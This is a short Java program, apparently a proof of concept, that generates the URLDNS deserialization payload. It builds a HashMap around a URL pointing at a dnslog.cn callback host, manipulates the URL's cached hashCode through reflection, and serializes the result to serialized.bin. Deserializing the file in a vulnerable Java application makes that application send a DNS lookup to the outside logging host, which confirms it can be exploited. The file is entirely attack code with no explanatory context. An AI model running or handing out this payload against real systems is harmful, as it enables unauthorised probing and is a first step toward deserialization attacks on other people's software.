import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://2ngvfa.dnslog.cn");
        Map<Object, Object> map = new HashMap<>();

        Class cls = url.getClass();
        Field hashCode = cls.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url, 1);

        map.put(url, "value");
        hashCode.set(url, -1);

        serialize(map);
//        unserialize("serialized.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialized.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
